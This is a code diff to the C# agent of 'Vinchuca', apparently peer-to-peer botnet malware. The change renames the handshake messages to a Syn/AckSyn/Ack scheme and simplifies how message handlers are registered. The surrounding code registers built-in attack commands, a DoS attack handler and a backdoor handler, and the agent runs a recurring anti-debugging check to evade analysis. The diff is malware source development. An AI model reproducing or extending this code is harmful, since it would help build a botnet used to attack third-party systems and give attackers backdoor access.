@@ -35,7 +35,7 @@ namespace Vinchuca
         public Agent(int port, BotIdentifier id)
         {
             BotIdentifier.Id = id;
-            Logger.Info("Vinchuca [id: {0}] listenning on port {1}", BotIdentifier.Id, port);
+            Logger.Info("Vinchuca Agent [id: {0}] listenning on port {1}", BotIdentifier.Id, port);
 
             _worker = ClientWorker.Instance;
             _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
@@ -63,46 +63,46 @@ namespace Vinchuca
         {
             // Peer-to-Peer system messages
             _messagesManager.Register(
-                MessageCode.Hello,
+                MessageCode.Syn,
                 MessageType.Request,
-                typeof(HelloMessage),
-                new HelloMessageHandler(_peerList, _messagesManager),
-                false,
+                typeof(HelloSynMessage),
+                new HelloSynMessageHandler(_peerList, _messagesManager),
                 (int)Difficulty.Hardest);
             _messagesManager.Register(
-                MessageCode.HelloReply,
+                MessageCode.AckSyn,
                 MessageType.Reply,
-                typeof(HelloReplyMessage),
-                new HelloReplyMessageHandler(_peerList, _messagesManager),
-                false,
+                typeof(HelloAckSynMessage),
+                new HelloAckSynMessageHandler(_peerList, _messagesManager),
+                (int)Difficulty.Medium);
+            _messagesManager.Register(
+                MessageCode.Ack,
+                MessageType.Reply,
+                typeof(HelloAckMessage),
+                new HelloAckMessageHandler(_peerList, _messagesManager),
                 (int)Difficulty.Medium);
             _messagesManager.Register(
                 MessageCode.GetPeerList,
                 MessageType.Request,
                 typeof(GetPeerListMessage),
                 new GetPeerListMessageHandler(_peerList, _messagesManager),
-                true,
                 (int)Difficulty.Hard);
             _messagesManager.Register(
                 MessageCode.GetPeerListReply,
                 MessageType.Reply,
                 typeof(GetPeerListReplyMessage),
                 new GetPeerListReplyMessageHandler(_peerList, _messagesManager),
-                true,
                 (int)Difficulty.Medium);
             _messagesManager.Register(
                 MessageCode.Ping,
                 MessageType.Request,
                 typeof(PingMessage),
                 new PingMessageHandler(_peerList, _messagesManager),
-                true,
                 (int)Difficulty.Easy);
             _messagesManager.Register(
                 MessageCode.Pong,
                 MessageType.Reply,
                 typeof(PongMessage),
                 new PongMessageHandler(_peerList, _messagesManager),
-                true,
                 (int)Difficulty.Easy);
 
             // built-in attack messages
@@ -111,21 +111,18 @@ namespace Vinchuca
                 MessageType.Request,
                 typeof(DosAttackMessage),
                 new DosAttackHandler(_peerList, _messagesManager),
-                true,
                 (int)Difficulty.NoWork);
             _messagesManager.Register(
                 MessageCode.Backdoor,
                 MessageType.Reply,
                 typeof(BackdoorHandler),
                 new BackdoorHandler(_messagesManager),
-                true,
                 (int)Difficulty.NoWork);
             _messagesManager.Register(
                 MessageCode.Unknown,
                 MessageType.Special,
                 typeof(InvalidMessage),
                 new InvalidMessageHandler(_peerList),
-                false,
                 (int)Difficulty.NoWork);
         }
 
@@ -145,8 +142,7 @@ namespace Vinchuca
             foreach (var peer in peers)
             {
                 _peerList.TryRegister(peer);
-
-                var hello = new HelloMessage();
+                var hello = new HelloSynMessage();
                 _messagesManager.Send(hello, peer.BotId);
             }
         }
